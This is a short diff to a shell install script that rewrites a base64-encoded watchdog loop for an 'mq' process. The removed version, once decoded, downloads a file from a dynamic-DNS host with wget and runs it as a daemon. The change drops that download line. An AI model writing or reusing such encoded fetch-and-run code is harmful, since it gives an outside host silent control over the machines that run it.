@@ -260,7 +260,7 @@ EOF
 
 cat << EOF > /tmp/loop
 
-c2xlZXAgNjAwCmlmICEgcGdyZXAgLWYgImFzaCAvdmFyL2Jpbi9tcSIgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAga2lsbGFsbCBzdWJjbGllbnQgcHViY2xpZW50IGFzaAogIHdnZXQgLU8gL3Zhci9iaW4vbXEgY29ubmVjdHRvdGhpcy5keW51LmNvbS9tcSA+L2Rldi9udWxsIDI+JjEKICBzdGFydC1zdG9wLWRhZW1vbiAtcCAvdmFyL3J1bi9tcS5waWQgLVMgLS1leGVjIGFzaCAvdmFyL2Jpbi9tcSAKZmkKZG9uZQoK
+c2xlZXAgNjAwCmlmICEgcGdyZXAgLWYgImFzaCAvdmFyL2Jpbi9tcSIgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAga2lsbGFsbCBzdWJjbGllbnQgcHViY2xpZW50IGFzaAogIHN0YXJ0LXN0b3AtZGFlbW9uIC1wIC92YXIvcnVuL21xLnBpZCAtUyAtLWV4ZWMgYXNoIC92YXIvYmluL21xIApmaQpkb25lCgo=
 
 EOF
 (cat /tmp/loop | base64 -d > $mq_binpath/loop  ; chmod +x $mq_binpath/loop; rm -f /tmp/loop)2>>$errorlog
